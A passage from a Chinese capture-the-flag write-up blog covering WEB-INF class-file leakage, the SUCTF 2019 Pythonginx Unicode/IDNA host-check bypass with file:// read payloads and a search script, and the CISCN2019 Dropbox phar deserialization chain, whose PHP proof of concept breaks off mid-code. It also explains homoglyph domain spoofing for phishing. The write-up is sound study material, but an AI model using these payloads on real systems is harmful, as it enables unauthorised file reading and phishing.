+<p>WEB-INF主要包含一下文件或目录：<br>   /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>   /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br>   /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>   /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>   /WEB-INF/database.properties：数据库配置文件<br> 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200224172350.png"></p>
+<p> 什么是 servlet ?</p>
+<blockquote>
+<p>Servlet（Server Applet）是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Java/85979">Java</a> Servlet的简称，称为小服务程序或服务连接器，用Java编写的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571">服务器</a>端程序，具有独立于平台和<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%8D%8F%E8%AE%AE/13020269">协议</a>的特性，主要功能在于交互式地浏览和生成数据，生成动态<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Web/150564">Web</a>内容。</p>
+<p>狭义的Servlet是指Java语言实现的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类，一般情况下，人们将Servlet理解为后者。Servlet运行于支持Java的应用服务器中。从原理上讲，Servlet可以响应任何类型的请求，但<strong>绝大多数情况下Servlet只用来扩展基于HTTP协议的Web服务器。</strong></p>
+<p>最早支持Servlet标准的是JavaSoft的Java [Web Server](<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Web">https://baike.baidu.com/item/Web</a> Server/9306055)，此后，一些其它的基于Java的Web服务器开始支持标准的Servlet。</p>
+<p>—- 百度百科</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200224145330.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200224151402.png"></p>
+<p>因为这个flag字段肯定在里面,所以对所有内容base64decode 肯定就能出flag</p>
+<p>这里用hackerbar POST 送 <code>/WEB-INF/classes/com/wm/ctf/FlagController.class</code> 即可下载 <code>.class</code> 文件 , 我用专门的Java 反编译软件没反应,用IDA 看了下,找到了那段base64的代码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200224152714.png"></p>
+<p>补充: </p>
+<p>在问了软工搞JAVA 的同学后, 应该是我的JAVA JDK 没有添加到环境变量,所有没有反应,搞了环境变量后就可以反编译了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200224161434.png"></p>
+<p>参考资料: </p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/durendong/article/details/54578519">https://blog.csdn.net/durendong/article/details/54578519</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jdjdndhj/article/details/52694202">https://blog.csdn.net/jdjdndhj/article/details/52694202</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lindiwo/article/details/80818345">https://blog.csdn.net/lindiwo/article/details/80818345</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11691839.html#web-infweb.xml%E6%B3%84%E9%9C%B2">https://www.cnblogs.com/20175211lyz/p/11691839.html#web-infweb.xml%E6%B3%84%E9%9C%B2</a></p>
+<h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h1><p>出题来源: <a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
+<blockquote>
+<p><strong>CVE-2019-9636：urlsplit不处理NFKC标准化</strong></p>
+</blockquote>
+<h2 id="IDNA"><a href="#IDNA" class="headerlink" title="IDNA"></a>IDNA</h2><p>（Internationalizing Domain Names in Applications）应用程序国际化域名</p>
+<ul>
+<li>​       IDNA是一种以标准方式处理ASCII以外字符的一种机制，它从unicode中提取字符，并允许非ASCII码字符以允许使用的ASCII字符表示。</li>
+<li>​       国际化域名(IDN)最初是由马丁·杜斯特于1996年12月提出。1998年在新加坡国立大学教授陈定炜的指导下，Tan  Juay Kwang和Leong Kok  Yong将其付诸实施。经过许多讨论和对比各种提案后，应用程序国际化域名（IDNA)被采纳为正式标准，并被用在许多顶级域名中。在IDNA中，“国际化域名”特指可以成功将IDNA转化为十进位制ASCII的域名。</li>
+</ul>
+<p>存在漏洞的 IDNA 版本: </p>
+<p><strong>IDNA2008</strong>阻断了分割域名的字符</p>
+<p><strong>IDNA2003</strong> 和 <strong>IDNA2008 + UTS46</strong>存在漏洞</p>
+<h2 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a>Unicode 编码</h2><p>中文名又叫<strong>万国码,国际码,统一码,单一码</strong>.是计算机科学领域里的一项业界标准。它对世界上大部分的文字系统进行了整理、编码，使得计算机可以用更为简单的方式来呈现和处理文字。Unicode涵盖的数据除了视觉上的字形、编码方法、标准的字符编码外，还包含了字符特性，如大小写字母。目前已经有超过 13 万个字符</p>
+<h2 id="ASCII-编码"><a href="#ASCII-编码" class="headerlink" title="ASCII 编码"></a>ASCII 编码</h2><p>ASCII（American Standard Code for Information  Interchange，美国信息交换标准代码）是基于拉丁字母的一套电脑编码系统，它主要用于显示现代英语，而其扩展版本EASCII则可以部分支持其他西欧语言，并等同于国际标准ISO/IEC 646。</p>
+<p>至今为止共定义了128个字符；其中<strong>33个字符无法显示</strong>（一些终端提供了扩展，使得这些字符可显示为诸如笑脸、扑克牌花式等8-bit符号），且这33个字符多数都已是<strong>陈废的控制字符</strong>。控制字符的用途主要是用来操控已经处理过的文字。在33个字符之外的是95个可显示的字符。用键盘敲下空白键所产生的空白字符也算1个可显示字符（显示为空白）。</p>
+<p>也就是说: ASCII 码由 : <strong>ASCII 打印字符, ASCII 非打印控制字符, 扩展ASCII 打印字符</strong></p>
+<h2 id="Url中的Unicode漏洞引发的域名安全问题"><a href="#Url中的Unicode漏洞引发的域名安全问题" class="headerlink" title="Url中的Unicode漏洞引发的域名安全问题"></a>Url中的Unicode漏洞引发的域名安全问题</h2><p>见参考资料[1]</p>
+<h3 id="域名欺骗"><a href="#域名欺骗" class="headerlink" title="域名欺骗"></a>域名欺骗</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;Вaidu.com 其中的B 是(unicode U+0412)</span><br></pre></td></tr></table></figure>
+
+<p>访问这个URL, 会跳转到 <code>http://www.xn--aidu-f4d.com/</code></p>
+<p><code>xn</code>:ACE(这是一个国际化域名编码)</p>
+<p><code>aidu</code>:ASCII码</p>
+<p><code>f4d</code>:状态机指令</p>
+<p>访问经过构造的URL时,过程是这样的: </p>
+<blockquote>
+<p>浏览器会将我们访问的url交给域名系统(DNS)解析url为ip地址，在<strong>解析url的过程</strong>中采用递归查询和迭代查询，即<strong>先递归搜索浏览器自己的的dns缓存，然后搜索操作系统的dns缓存，接着搜索hosts文件缓存，搜索本地域名服务器，然后迭代搜索根域名服务器……，直到找到ip地址</strong>为止，找不到就返回404notfound，而在DNS中，<strong>国际化域名(IDNA)使用Punycode转写并以美国信息交换标准代码（ASCII）字符串储存。在本地DNS中，因为遇见特殊字符В，而无法将此url正常转化为ASCII，因此就直接在本地转化</strong>为<code>http://xn--aidu-f4d.com/</code>这种形式的url。</p>
+</blockquote>
+<p><strong>IDNA转写ASCII的过程又分为两步</strong></p>
+<p><strong>1. Normalization</strong></p>
+<p>Convert characters to a “standardized form”.</p>
+<p>第一步：正常化，将字符转化为标准形式</p>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Å (U+00C5),Å (U+212B),Å (U+0041, U+030A)将会被标准化为å (U+00E5)</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. Punycoding</strong></p>
+<p>Turn Unicode into ASCII.</p>
+<p>第二步：用punycode编码将unicode编码成ASCII码</p>
+<p>现在我们已经知道，在我们访问域名<code>http://Вaidu.com</code>时，浏览器会将此unicode转化为ASCII码，然后访问<code>http://xn--aidu-f4d.com/</code>,如果我们注册了<code>http://xn--aidu-f4d.com/</code>这个域名，那么我们就可以将访问<code>http://Вaidu.com</code>的受害者转到这个域名下，从而实现<strong>钓鱼攻击</strong>。</p>
+<h3 id="域名分割"><a href="#域名分割" class="headerlink" title="域名分割"></a>域名分割</h3><p>访问: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;evil.c℀a.aaa.com </span><br></pre></td></tr></table></figure>
+
+<p>浏览器会访问: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;evil.ca&#x2F;ca.aaa.com</span><br></pre></td></tr></table></figure>
+
+<p>unicode中还有一种字符<code>℀</code>(U+2100)，当IDNA处理此字符时，会将<code>℀</code>变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制了。</p>
+<p>unicode转ASCII发生在IDNA中的TOASCII操作中。如果能通过TOASCII转换时，将会以正常的字符呈现。而<strong>如果不能通过TOASCII转换时，就会使用“ACE标签”，“ACE”标签使输入的域名能转化为ASCII码</strong></p>
+<p>其他可利用的unicode 字符: </p>
+<p>U+2100, <code>℀</code>      U+2101, <code>℁</code>        U+2105, <code>℅</code>    U+2106, <code>℆</code>    U+FF0F,<code>／</code>    U+2047, <code>⁇</code>    U+2048, <code>⁈</code>   U+2049, <code>⁉</code></p>
+<p>U+FE16, <code>︖</code>     U+FE56, <code>﹖</code>   U+FF1F,<code>？</code>    U+FE5F, <code>﹟</code>    U+FF03, <code>＃</code>      U+FE6B, <code>﹫</code>    U+FF20, <code>＠</code></p>
+<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>参考资料: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/liang-io/p/9340335.html">https://www.cnblogs.com/liang-io/p/9340335.html</a></p>
+<p>Nginx 是一款<strong>轻量级的Web  服务器／反向代理服务器及电子邮件（IMAP/POP3）代理服务器</strong>，并在一个BSD-like 协议下发行。由俄罗斯的程序设计师Igor  Sysoev所开发，最初供俄国大型的入口网站及搜寻引擎Rambler（俄文：Рамблер）使用。 其特点是占有<strong>内存少，并发能力强.</strong></p>
+<p>Nginx 重要文件配置: </p>
+<ul>
+<li><p>conf 目录是 nginx 所有配置文件的目录 ,nginx.conf 是nginx 默认的主配置文件</p>
+</li>
+<li><p>配置文件存放目录：/etc/nginx</p>
+</li>
+<li><p>主配置文件：/etc/nginx/conf/nginx.conf 或 /etc/nginx/nginx.conf</p>
+</li>
+<li><p>管理脚本：/usr/lib64/systemd/system/nginx.service</p>
+</li>
+<li><p>模块：/usr/lisb64/nginx/modules</p>
+</li>
+<li><p>应用程序：/usr/sbin/nginx</p>
+</li>
+<li><p>程序默认存放位置：/usr/share/nginx/html</p>
+</li>
+<li><p>日志默认存放位置：/var/log/nginx</p>
+</li>
+</ul>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>大师傅的非预期: <code>/getUrl?url=file:////suctf.cc/../../../../../usr/fffffflag</code> </p>
+<p>原理: </p>
+<p>参考资料 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6281">https://xz.aliyun.com/t/6281</a></p>
+<p>Python <code>urlunsplit()</code>函数源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">urlunsplit</span>(<span class="params">components</span>):</span></span><br><span class="line">    scheme, netloc, url, query, fragment, _coerce_result = (</span><br><span class="line">                                          _coerce_args(*components))</span><br><span class="line">    <span class="keyword">if</span> netloc <span class="keyword">or</span> (scheme <span class="keyword">and</span> scheme <span class="keyword">in</span> uses_netloc <span class="keyword">and</span> url[:<span class="number">2</span>] != <span class="string">&#x27;//&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> url <span class="keyword">and</span> url[:<span class="number">1</span>] != <span class="string">&#x27;/&#x27;</span>: url = <span class="string">&#x27;/&#x27;</span> + url</span><br><span class="line">        url = <span class="string">&#x27;//&#x27;</span> + (netloc <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>) + url</span><br><span class="line">    <span class="keyword">if</span> scheme:</span><br><span class="line">        url = scheme + <span class="string">&#x27;:&#x27;</span> + url</span><br><span class="line">    <span class="keyword">if</span> query:</span><br><span class="line">        url = url + <span class="string">&#x27;?&#x27;</span> + query</span><br><span class="line">    <span class="keyword">if</span> fragment:</span><br><span class="line">        url = url + <span class="string">&#x27;#&#x27;</span> + fragment</span><br><span class="line">    <span class="keyword">return</span> _coerce_result(url)</span><br></pre></td></tr></table></figure>
+
+<p>这个函数的用法和PHP中的<code>parse_url()</code> 很像, 都是将URL中的各个部分组成一个列表list(数组array)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200225171939.png"></p>
+<p>预期: </p>
+<p>Python 菜,直接(～￣▽￣)嫖脚本, 以后再研究</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlunsplit, urlsplit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span>():</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">        uni = chr(x)</span><br><span class="line">        url = <span class="string">&quot;http://suctf.c&#123;&#125;&quot;</span>.format(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                print(<span class="string">&quot;str: &quot;</span> + uni + <span class="string">&#x27; unicode: \\u&#x27;</span> + str(hex(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>(<span class="params">url</span>):</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">用这些去代替suctf.cc中最后那个c即可</span><br><span class="line">str: ℂ unicode: \u2102</span><br><span class="line">str: ℭ unicode: \u212d</span><br><span class="line">str: Ⅽ unicode: \u216d</span><br><span class="line">str: ⅽ unicode: \u217d</span><br><span class="line">str: Ⓒ unicode: \u24b8</span><br><span class="line">str: ⓒ unicode: \u24d2</span><br><span class="line">str: Ｃ unicode: \uff23</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200225164852.png"></p>
+<p>利用file://协议读文件, 然后 这个 <code>alias</code> 是在nginx 中,用来设置虚拟目录用的,alias指定的目录是准确的，即<strong>location匹配访问的path目录下的文件直接是在alias目录下查找的</strong></p>
+<p>说明 <code>/flag</code> 直接在 <code>/usr/fffffflag</code> 中读取</p>
+<p><code>/getUrl?url=file://suctf.c%E2%85%AD/usr/fffffflag </code> 即可读取flag</p>
+<p>再来分析一下原理: </p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200225170142.png"></p>
+<ol>
+<li><p>在前面两个 if 判断 host 是否为 suctf.cc 时, 因为 <code>suctf.cⅭ</code> 所以成功绕过</p>
+</li>
+<li><p>然后对host 进行 idna编码 再进行 utf-8 解码 这就导致了漏洞的出现.</p>
+</li>
+</ol>
+<p>当传入<code>℆</code> 这个为最后一个c,最后第三部就成为了<code>suctf.cc/u</code>然后就可以读取 <code>usr</code>目录下的敏感文件.</p>
+<p>参考资料: </p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6070">https://xz.aliyun.com/t/6070</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6057">https://xz.aliyun.com/t/6057</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6281">https://xz.aliyun.com/t/6281</a></p>
+<p><a target="_blank" rel="noopener" href="https://bugs.python.org/issue36216">https://bugs.python.org/issue36216</a></p>
+<p><a target="_blank" rel="noopener" href="https://lihuaiqiu.github.io/2019/08/27/SUCTF2019/">https://lihuaiqiu.github.io/2019/08/27/SUCTF2019/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11470200.html#cve-2019-9636urlsplit%E4%B8%8D%E5%A4%84%E7%90%86nfkc%E6%A0%87%E5%87%86%E5%8C%96">https://www.cnblogs.com/20175211lyz/p/11470200.html#cve-2019-9636urlsplit%E4%B8%8D%E5%A4%84%E7%90%86nfkc%E6%A0%87%E5%87%86%E5%8C%96</a></p>
+<p><a target="_blank" rel="noopener" href="https://xi4or0uji.github.io/2019/08/25/2019-SUCTF-wp/#Pythonginx">https://xi4or0uji.github.io/2019/08/25/2019-SUCTF-wp/#Pythonginx</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/99741920">https://blog.csdn.net/qq_42181428/article/details/99741920</a></p>
+<h1 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1><ul>
+<li><p>任意文件下载</p>
+</li>
+<li><p>phar 反序列化 </p>
+</li>
+</ul>
+<p>因为注册(register.php)账号后,只有一个上传(upload.php)图片,抓包试试看删除,出现了delete.php</p>
+<p>本来想试试扫目录的,按理说应该可以扫到 download.php ,但是猜也应该有下载功能,从题目(云盘),那应该也有download吧!!!</p>
+<p>依次下载 index,login,class,download的PHP源码 , 然后进行代码审计</p>
+<p>在class.php 中的 第<code>158</code> 行,存在文件读取函数<code>file_get_contents()</code> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename); <span class="comment">// 在File 类</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$func, $args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    array_push(<span class="keyword">$this</span>-&gt;func, $func);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 在95,96 行存在 __call()魔法函数,该函数用于监视对象中的其他方法,当去调用一个对象中不存在的方法时,该函数就会被触发</span></span><br></pre></td></tr></table></figure>
+
+<p>然后之前学到过,Phar 反序列化会影响到该函数,这里为什么会想到反序列化呢?并且没有<code>serialize()</code>序列化和<code>unserialize()</code> 反序列化函数</p>
+<p>然后将 <code>158</code>行的 filename 进行跟踪, 是属于 <code>File</code> 类的, 既然要想读取文件,又是关于面向对象的,又没有序列化相关的函数,所以只有phar 反序列, 该反序列化不需要序列化相关的函数都能进行</p>
+<p>在<code>login.php</code> 中的<code>71,72,73</code> 得到沙箱的文件路径,但是做这道题没有用处</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sandbox = <span class="string">&quot;uploads/&quot;</span> . sha1($_SESSION[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&quot;sftUahRiTz&quot;</span>) . <span class="string">&quot;/&quot;</span>; <span class="comment">// 上传文件的路径为uploads/sha1(&#x27;username&#x27;)sftUahRiTz/</span></span><br><span class="line"><span class="keyword">if</span> (!is_dir($sandbox)) &#123; <span class="comment">// 如果不存在sandbox 的路径,就创建</span></span><br><span class="line">    mkdir($sandbox);</span><br></pre></td></tr></table></figure>
+
+<p>在<code>download.php</code> 中的第<code>13</code>行: </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">&quot;open_basedir&quot;</span>, getcwd() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"><span class="comment">// 只能读写 /etc 和 /tmp 和当前目录(getcwd()) </span></span><br><span class="line"><span class="comment">// hint: 必须要在delete.php中利用payload</span></span><br></pre></td></tr></table></figure>
+
+<p><code>open_basedir</code> : 是PHP设置中为了<strong>防御PHP跨目录进行文件（目录）读写</strong>的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查。Open_basedir实际上是一些目录的集合，在<strong>定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中</strong>。</p>
+<p>设置open_basedir的方法，在linux下，不同的目录由“:”分割，如“/var/www/:/tmp/”；在Windows下不同目录由“;”分割，如“c:/www;c:/windows/temp”。</p>
+<p>第<code>18</code>行中: </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span></span><br><span class="line">    <span class="comment">// 判断文件名长度小于40 ,并且文件名中不能含有flag 字段</span></span><br><span class="line">    <span class="comment">// hint: flag的文件名中含有flag字段</span></span><br></pre></td></tr></table></figure>
+
+<p>在User类中存在 close()方法,在对象销毁时执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$func, $args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    array_push(<span class="keyword">$this</span>-&gt;func, $func);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>FileList类中存在<code>__call()</code> 魔法函数,该类没有close()方法,如果该类去调用close()方法,就会触发<code>__call()</code>魔法函数</p>
+<p>如果能创建一个user的对象，其db变量是一个FileList对象，对象中的文件名为flag的位置。这样的话，当user对象销毁时，db变量的close方法被执行；而db变量没有close方法，这样就会触发call魔术方法，进而变成了执行File对象的close方法。通过分析FileList类的析构方法可以知道，close方法执行后存在results变量里的结果会加入到table变量中被打印出来，也就是flag会被打印出来。</p>
+<p>当上传phar后缀的文件时, <code>&#123;&quot;success&quot;:false,&quot;error&quot;:&quot;Only gif\/jpg\/png allowed&quot;&#125;</code></p>
+<p>但是这一点无影响,<strong>只要内容是phar 文件的各式, 不管上传什么后缀的文件都会被解析为phar文件</strong></p>
+<p>POC: </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename = <span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">&quot;expexp.phar&quot;</span>);</span><br><span class="line"><span class="comment">// 